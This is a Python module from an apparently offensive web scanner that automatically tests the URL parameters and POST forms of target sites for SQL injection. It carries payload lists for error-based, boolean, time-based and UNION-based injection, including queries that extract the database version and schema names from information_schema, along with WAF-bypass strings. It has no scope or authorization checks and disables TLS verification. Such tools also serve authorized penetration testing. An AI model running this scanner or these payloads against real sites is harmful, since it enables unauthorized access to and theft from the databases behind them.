import aiohttp
import asyncio
import time
import random
from urllib.parse import urlparse, parse_qs, urlencode
from modules.core import console

SQL_ERRORS = {
    "MySQL": [
        "You have an error in your SQL syntax", "check the manual that corresponds to your MySQL server version",
        "mysql_fetch_array()", "mysql_fetch_assoc()", "mysql_fetch_row()", "mysql_num_rows()",
        "Warning: mysql_", "function.mysql", "MySQL result index", "MySQL Error", "MySQL ODBC",
        "Column count doesn't match", "the used select statements have different number of columns",
        "Table doesn't exist", "Unknown column", "Unknown table", "Duplicate entry",
        "mysql_real_escape_string()", "mysql_connect()", "Access denied for user"
    ],
    "PostgreSQL": [
        "PostgreSQL query failed", "supplied argument is not a valid PostgreSQL result",
        "unterminated quoted string at or near",
        "pg_query()", "pg_exec()", "pg_fetch_array()", "pg_fetch_assoc()", "pg_fetch_row()",
        "PG::SyntaxError:", "FATAL: syntax error at or near", "ERROR: column", "ERROR: relation",
        "ERROR: operator does not exist", "ERROR: function", "ERROR: invalid input syntax",
        "pg_connect(): Unable to connect", "PostgreSQL Error:"
    ],
    "MSSQL": [
        "Microsoft OLE DB Provider for ODBC Drivers", "Microsoft OLE DB Provider for SQL Server",
        "Unclosed quotation mark after the character string", "Microsoft JET Database Engine",
        "ADODB.Field error", "BOF or EOF", "ADODB.Command", "JET Database",
        "Msg 102, Level 15, State 1", "Incorrect syntax near", "Cannot insert duplicate key",
        "String or binary data would be truncated", "Invalid column name", "Invalid object name",
        "SqlException", "System.Data.SqlClient.SqlException", "Unclosed quotation mark"
    ],
    "Oracle": [
        "ORA-01756: quoted string not properly terminated", "ORA-00979: not a GROUP BY expression",
        "ORA-00933: SQL command not properly ended", "ORA-00936: missing expression",
        "ORA-00942: table or view does not exist", "ORA-00904: invalid identifier",
        "ORA-01722: invalid number", "ORA-01861: literal does not match format string",
        "ORA-01400: cannot insert NULL", "ORA-00001: unique constraint",
        "Oracle error", "quoted string not properly terminated", "ORA-"
    ],
    "SQLite": [
        "SQLite/JDBCDriver", "SQLite.Exception", "System.Data.SQLite.SQLiteException",
        "Warning: sqlite_", "function.sqlite", "SQLite result index", "SQLite3::SQLException",
        "sqlite3.OperationalError:", "sqlite3.DatabaseError:", "no such table:", "no such column:",
        "unrecognized token:", "SQLite3::Exception"
    ],
    "MongoDB": [
        "MongoClient.connect", "MongoError", "CastError", "ValidationError", "11000 E11000",
        "ReferenceError: db is not defined", "TypeError: db.collection is not a function",
        "MongoServerError", "MongoNetworkError"
    ]
}

SQL_PAYLOADS = {
    "error_based": [
        "'", '"', "')", '")', "';--", '";--', "' OR '1'='1", '" OR "1"="1',
        "' OR 1=1--", '" OR 1=1--', "' UNION SELECT NULL--", '" UNION SELECT NULL--',
        "'+(SELECT 0 WHERE 1=0)+'", '"+(SELECT 0 WHERE 1=0)+"',
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e))--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "' OR 1=1 LIMIT 1--",
    ],
    "boolean_based": [
        "' AND 1=1--", "' AND 1=2--", '" AND 1=1--', '" AND 1=2--',
        "' AND 'a'='a", "' AND 'a'='b", '" AND "a"="a', '" AND "a"="b',
        "' AND (SELECT SUBSTRING(VERSION(),1,1))='5'--", "' AND (SELECT SUBSTRING(VERSION(),1,1))='4'--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>1000--",
        "' OR 1=1--", "' OR 1=2--",
    ],
    "time_based": [
        "'; WAITFOR DELAY '00:00:05'--", "'; SELECT SLEEP(5)--", "' AND SLEEP(5)--",
        "'; pg_sleep(5)--", "' AND pg_sleep(5)--", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' UNION SELECT SLEEP(5)--", "' OR SLEEP(5)--", "' AND IF(1=1,SLEEP(5),0)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))b UNION SELECT 1)--",
        "1; WAITFOR DELAY '0:0:5'--",
    ],
    "union_based": [
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--", "' UNION SELECT version(),2,3--", "' UNION SELECT user(),2,3--",
        "' UNION SELECT database(),2,3--", "' UNION SELECT @@version,2,3--",
        "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
        "' UNION SELECT column_name,2,3 FROM information_schema.columns--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
    ]
}

WAF_BYPASS_PAYLOADS = [
    "/**/UNION/**/SELECT/**/", "/*!UNION*//*!SELECT*/", "UNI/**/ON/**/SEL/**/ECT",
    "union%0Aselect", "union%0Dselect", "union%0A%0Dselect", "union%09select",
    "UNION(SELECT", "UNION%20SELECT", "UNION%09SELECT", "UNION%0ASELECT",
    "+UNION+SELECT+", "-UNION-SELECT-", "/**/OR/**/", "/*!OR*/", "OR%0A",
    "'/**/OR/**/1=1/**/--", "'/**/AND/**/1=1/**/--", "'/**/UNION/**/ALL/**/SELECT/**/"
]


async def test_error_based_sqli(session, url, param, original_response):
    """Test for error-based SQL injection"""
    vulnerabilities = []

    for payload in SQL_PAYLOADS["error_based"]:
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param] = [payload]
            query_string = urlencode(params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=12), ssl=False) as resp:
                text = await resp.text(errors='replace')

                for db_type, errors in SQL_ERRORS.items():
                    for error in errors:
                        if error.lower() in text.lower() and error.lower() not in original_response.lower():
                            console.print(f"  [bold red][!] SQL Injection Found (Error-Based)[/bold red]")
                            console.print(f"    [cyan]Parameter:[/cyan] {param}")
                            console.print(f"    [cyan]Payload:[/cyan] {payload}")
                            console.print(f"    [cyan]Database:[/cyan] {db_type}")
                            console.print(f"    [cyan]URL:[/cyan] {test_url}")

                            vulnerabilities.append({
                                "type": "SQL Injection (Error-Based)",
                                "method": "GET",
                                "param": param,
                                "parameter": param,
                                "payload": payload,
                                "db": db_type,
                                "database": db_type,
                                "url": test_url,
                                "severity": "Critical"
                            })
                            return vulnerabilities
        except Exception:
            continue

    return vulnerabilities


async def test_boolean_based_sqli(session, url, param, original_response):
    """Test for boolean-based blind SQL injection"""
    vulnerabilities = []
    original_length = len(original_response)

    true_payloads = ["' AND 1=1--", "' AND 'a'='a--", "' OR 1=1--"]
    false_payloads = ["' AND 1=2--", "' AND 'a'='b--", "' OR 1=2--"]

    for true_payload, false_payload in zip(true_payloads, false_payloads):
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param] = [true_payload]
            query_string = urlencode(params, doseq=True)
            true_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

            async with session.get(true_url, timeout=aiohttp.ClientTimeout(total=12), ssl=False) as resp:
                true_response = await resp.text(errors='replace')
                true_length = len(true_response)

            params[param] = [false_payload]
            query_string = urlencode(params, doseq=True)
            false_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

            async with session.get(false_url, timeout=aiohttp.ClientTimeout(total=12), ssl=False) as resp:
                false_response = await resp.text(errors='replace')
                false_length = len(false_response)

            diff_true_orig = abs(true_length - original_length)
            diff_false_orig = abs(false_length - original_length)
            diff_true_false = abs(true_length - false_length)

            if diff_true_false > 80 and diff_true_orig < diff_false_orig:
                console.print(f"  [bold yellow][!] Boolean-Based SQL Injection Detected[/bold yellow]")
                console.print(f"    [cyan]Parameter:[/cyan] {param}")
                console.print(f"    [cyan]True Payload:[/cyan] {true_payload}")
                console.print(f"    [cyan]Response Delta:[/cyan] {diff_true_false} chars")

                vulnerabilities.append({
                    "type": "SQL Injection (Boolean-Based Blind)",
                    "method": "GET",
                    "param": param,
                    "parameter": param,
                    "payload": true_payload,
                    "url": true_url,
                    "severity": "High",
                    "confidence": "Medium",
                    "response_diff": diff_true_false
                })
                break
        except Exception:
            continue

    return vulnerabilities


async def test_time_based_sqli(session, url, param):
    """Test for time-based blind SQL injection"""
    vulnerabilities = []

    for payload in SQL_PAYLOADS["time_based"]:
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param] = [payload]
            query_string = urlencode(params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

            start_time = time.time()
            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=18), ssl=False) as resp:
                await resp.text(errors='replace')
            elapsed = time.time() - start_time

            if elapsed > 4.0:
                console.print(f"  [bold red][!] Time-Based SQL Injection Found[/bold red]")
                console.print(f"    [cyan]Parameter:[/cyan] {param}")
                console.print(f"    [cyan]Payload:[/cyan] {payload}")
                console.print(f"    [cyan]Response Time:[/cyan] {elapsed:.2f}s")

                vulnerabilities.append({
                    "type": "SQL Injection (Time-Based Blind)",
                    "method": "GET",
                    "param": param,
                    "parameter": param,
                    "payload": payload,
                    "url": test_url,
                    "response_time": f"{elapsed:.2f}s",
                    "severity": "Critical"
                })
                return vulnerabilities
        except asyncio.TimeoutError:
            console.print(f"  [bold red][!] Possible Time-Based SQLi (Timeout) - {param}[/bold red]")
            vulnerabilities.append({
                "type": "SQL Injection (Time-Based Blind)",
                "method": "GET",
                "param": param,
                "parameter": param,
                "payload": payload,
                "url": url,
                "response_time": "Timeout (>18s)",
                "severity": "Critical"
            })
            return vulnerabilities
        except Exception:
            continue

    return vulnerabilities


async def test_union_based_sqli(session, url, param, original_response):
    """Test for UNION-based SQL injection"""
    vulnerabilities = []

    for payload in SQL_PAYLOADS["union_based"]:
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param] = [payload]
            query_string = urlencode(params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=12), ssl=False) as resp:
                text = await resp.text(errors='replace')

                union_indicators = ["mysql", "version()", "@@version", "user()", "database()", "information_schema", "pg_catalog"]

                for indicator in union_indicators:
                    if indicator in text.lower() and indicator not in original_response.lower():
                        console.print(f"  [bold red][!] UNION-Based SQL Injection Found[/bold red]")
                        console.print(f"    [cyan]Parameter:[/cyan] {param}")
                        console.print(f"    [cyan]Payload:[/cyan] {payload}")
                        console.print(f"    [cyan]Indicator:[/cyan] {indicator}")

                        vulnerabilities.append({
                            "type": "SQL Injection (UNION-Based)",
                            "method": "GET",
                            "param": param,
                            "parameter": param,
                            "payload": payload,
                            "url": test_url,
                            "indicator": indicator,
                            "severity": "Critical"
                        })
                        return vulnerabilities
        except Exception:
            continue

    return vulnerabilities


async def test_post_sqli(session, form):
    """Test SQL injection via POST form parameters"""
    vulnerabilities = []
    action_url = form.get("action", "")
    inputs = form.get("inputs", [])

    if not action_url or not inputs:
        return vulnerabilities

    for target_input in inputs:
        param_name = target_input.get("name", "")
        if not param_name:
            continue

        for payload in SQL_PAYLOADS["error_based"][:6]:
            post_data = {}
            for inp in inputs:
                n = inp.get("name", "")
                if n == param_name:
                    post_data[n] = payload
                else:
                    post_data[n] = inp.get("value", "test")

            try:
                async with session.post(action_url, data=post_data,
                                        timeout=aiohttp.ClientTimeout(total=12), ssl=False) as resp:
                    text = await resp.text(errors='replace')

                    for db_type, errors in SQL_ERRORS.items():
                        for error in errors:
                            if error.lower() in text.lower():
                                console.print(f"  [bold red][!] POST SQL Injection Found[/bold red]")
                                console.print(f"    [cyan]Form URL:[/cyan] {action_url}")
                                console.print(f"    [cyan]Parameter:[/cyan] {param_name}")
                                console.print(f"    [cyan]Payload:[/cyan] {payload}")
                                console.print(f"    [cyan]Database:[/cyan] {db_type}")

                                vulnerabilities.append({
                                    "type": "SQL Injection (POST - Error-Based)",
                                    "method": "POST",
                                    "form_url": action_url,
                                    "param": param_name,
                                    "parameter": param_name,
                                    "payload": payload,
                                    "db": db_type,
                                    "database": db_type,
                                    "url": action_url,
                                    "severity": "Critical"
                                })
                                return vulnerabilities
            except Exception:
                continue

        await asyncio.sleep(0.3)

    return vulnerabilities


async def test_sqli_comprehensive(session, url):
    """Comprehensive SQL injection testing on a single URL"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return []

    vulnerabilities = []

    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=12), ssl=False) as resp:
            original_response = await resp.text(errors='replace')
    except Exception:
        return []

    for param in params:
        console.print(f"[dim]  [SQLi] Testing param: {param}[/dim]")

        error_vulns = await test_error_based_sqli(session, url, param, original_response)
        vulnerabilities.extend(error_vulns)

        if not error_vulns:
            union_vulns = await test_union_based_sqli(session, url, param, original_response)
            vulnerabilities.extend(union_vulns)

            if not union_vulns:
                boolean_vulns = await test_boolean_based_sqli(session, url, param, original_response)
                vulnerabilities.extend(boolean_vulns)

                if not boolean_vulns:
                    time_vulns = await test_time_based_sqli(session, url, param)
                    vulnerabilities.extend(time_vulns)

        await asyncio.sleep(0.3)

    return vulnerabilities


async def run_sqli_scan(session, urls, forms=None):
    """Advanced SQL injection scanner — GET parameters + POST forms"""
    console.print("\n[bold red]--- Advanced SQL Injection Scanner ---[/bold red]")
    console.print("[dim]Testing Error-Based, Boolean-Based, Time-Based, UNION-Based (GET + POST)...[/dim]")

    all_vulnerabilities = []
    for url in urls:
        console.print(f"\n[bold cyan][SQLi] Testing URL:[/bold cyan] {url}")
        vulns = await test_sqli_comprehensive(session, url)
        all_vulnerabilities.extend(vulns)
        await asyncio.sleep(0.5)

    if forms:
        console.print(f"\n[bold cyan][SQLi] Testing {len(forms)} forms (POST)...[/bold cyan]")
        for form in forms:
            console.print(f"  [dim]Form: {form.get('action')} [{form.get('method','get').upper()}][/dim]")
            if form.get('method', 'get').lower() == 'post':
                vulns = await test_post_sqli(session, form)
                all_vulnerabilities.extend(vulns)
                await asyncio.sleep(0.5)

    if all_vulnerabilities:
        critical = [v for v in all_vulnerabilities if v.get('severity') == 'Critical']
        high = [v for v in all_vulnerabilities if v.get('severity') == 'High']
        console.print(f"\n[bold red][!] {len(all_vulnerabilities)} SQL Injection vulnerabilities found![/bold red]")
        if critical:
            console.print(f"    [bold red]Critical: {len(critical)}[/bold red]")
        if high:
            console.print(f"    [bold yellow]High: {len(high)}[/bold yellow]")
    else:
        console.print("\n[bold green][+] No SQL injection vulnerabilities detected[/bold green]")

    return all_vulnerabilities
